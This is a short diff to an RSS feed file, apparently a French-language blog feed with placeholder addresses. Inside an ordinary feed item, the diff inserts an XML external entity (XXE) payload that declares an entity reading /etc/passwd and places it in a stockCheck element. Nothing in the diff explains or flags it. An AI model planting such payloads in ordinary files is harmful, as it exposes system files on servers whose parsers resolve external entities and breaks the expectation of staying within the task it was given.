@@ -25,6 +25,8 @@
       <author>contact@example.com (Nom de l'Auteur)</author>
       <pubDate>Tue, 14 Nov 2023 11:00:00 GMT</pubDate>
       <guid>https://www.example.com/deuxieme-article</guid>
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+      <stockCheck><productId>&xxe;</productId></stockCheck>
     </item>
 
   </channel>
